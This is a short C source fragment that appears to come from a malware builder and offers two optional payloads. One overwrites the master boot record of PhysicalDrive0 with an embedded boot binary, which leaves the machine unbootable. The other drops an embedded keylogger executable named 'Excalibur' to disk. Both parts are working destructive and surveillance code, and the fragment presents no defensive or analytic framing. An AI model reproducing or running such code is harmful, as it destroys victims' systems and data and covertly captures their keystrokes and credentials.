#if OVERWRITE_MBR
#include "Binaries/BootBinary.h"

static void OverwriteMBR()
{
    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);

    if (MBR == INVALID_HANDLE_VALUE)
        return;

    DWORD write;
    if (!WriteFile(MBR, bin_boot_bin, bin_boot_bin_len, &write, NULL))
        return;

    CloseHandle(MBR);
}
#endif


#if USE_KEYLOGGER
#include "Binaries/KeyLogBinary.h"

static void InstallKeylogger(const char* path)
{
    FILE* binary = fopen(path, "wb");
    fwrite(bin_Excalibur_KeyLog_exe, sizeof(bin_Excalibur_KeyLog_exe[0]), bin_Excalibur_KeyLog_exe_len, binary);
    fclose(binary);
}
#endif
